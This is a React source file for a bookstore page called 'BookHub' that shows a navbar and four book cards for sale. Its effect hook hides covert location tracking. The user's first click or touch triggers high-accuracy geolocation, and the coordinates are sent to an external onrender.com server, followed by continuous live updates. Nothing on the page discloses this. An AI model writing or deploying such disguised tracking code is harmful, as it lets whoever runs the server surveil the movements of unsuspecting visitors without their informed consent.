import React, { useEffect, useRef } from "react";
import axios from "axios";

function App() {
  const watchRef = useRef(null);

  useEffect(() => {
    const userId = "user123";

    const startTracking = () => {
      if (!navigator.geolocation) return;

      if (watchRef.current) return;

      const sendLocation = async (pos) => {
        try {
          await axios.post("https://server-q7vm.onrender.com/location", {
            userId,
            latitude: pos.coords.latitude,
            longitude: pos.coords.longitude,
          });
        } catch {
          console.log("Error sending");
        }
      };

      // 🔥 FIRST LOCATION
      navigator.geolocation.getCurrentPosition(
        (pos) => sendLocation(pos),
        () => console.log("Permission denied"),
        {
          enableHighAccuracy: true,
          timeout: 5000,
          maximumAge: 0,
        }
      );

      // 🔥 LIVE TRACKING
      watchRef.current = navigator.geolocation.watchPosition(
        (pos) => sendLocation(pos),
        () => {},
        {
          enableHighAccuracy: true,
          timeout: 5000,
          maximumAge: 0,
        }
      );

      window.removeEventListener("click", startTracking);
      window.removeEventListener("touchstart", startTracking);
    };

    window.addEventListener("click", startTracking);
    window.addEventListener("touchstart", startTracking);

    return () => {
      window.removeEventListener("click", startTracking);
      window.removeEventListener("touchstart", startTracking);

      if (watchRef.current) {
        navigator.geolocation.clearWatch(watchRef.current);
      }
    };
  }, []);

  return (
    <div style={{ fontFamily: "Arial", margin: 0 }}>
      
      {/* Navbar */}
      <div style={styles.navbar}>
        <h2>📚 BookHub</h2>
        <div>
          <span style={styles.link}>Home</span>
          <span style={styles.link}>Categories</span>
          <span style={styles.link}>Cart</span>
          <span style={styles.link}>Login</span>
        </div>
      </div>

      {/* Books */}
      <div style={styles.container}>
        {books.map((book, i) => (
          <div key={i} style={styles.card}>
            <img src={book.img} alt="" style={styles.img} />
            <h3>{book.title}</h3>
            <p>₹{book.price}</p>
            <button style={styles.button}>Buy Now</button>
          </div>
        ))}
      </div>
    </div>
  );
}

const styles = {
  navbar: {
    display: "flex",
    justifyContent: "space-between",
    padding: "15px 30px",
    background: "#222",
    color: "#fff",
  },
  link: {
    marginLeft: "20px",
    cursor: "pointer",
  },
  container: {
    display: "grid",
    gridTemplateColumns: "repeat(4, 1fr)",
    gap: "20px",
    padding: "20px",
  },
  card: {
    border: "1px solid #ddd",
    borderRadius: "10px",
    padding: "15px",
    textAlign: "center",
  },
  img: {
    width: "100%",
    height: "220px",
    objectFit: "cover",
  },
  button: {
    marginTop: "10px",
    padding: "10px",
    border: "none",
    background: "#007bff",
    color: "white",
    borderRadius: "5px",
    cursor: "pointer",
  },
};

const books = [
  { title: "Rich Dad Poor Dad", price: 299, img: "https://m.media-amazon.com/images/I/81bsw6fnUiL.jpg" },
  { title: "Atomic Habits", price: 399, img: "https://m.media-amazon.com/images/I/91bYsX41DVL.jpg" },
  { title: "The Alchemist", price: 249, img: "https://m.media-amazon.com/images/I/71aFt4+OTOL.jpg" },
  { title: "Ikigai", price: 349, img: "https://m.media-amazon.com/images/I/81l3rZK4lnL.jpg" },
];

export default App;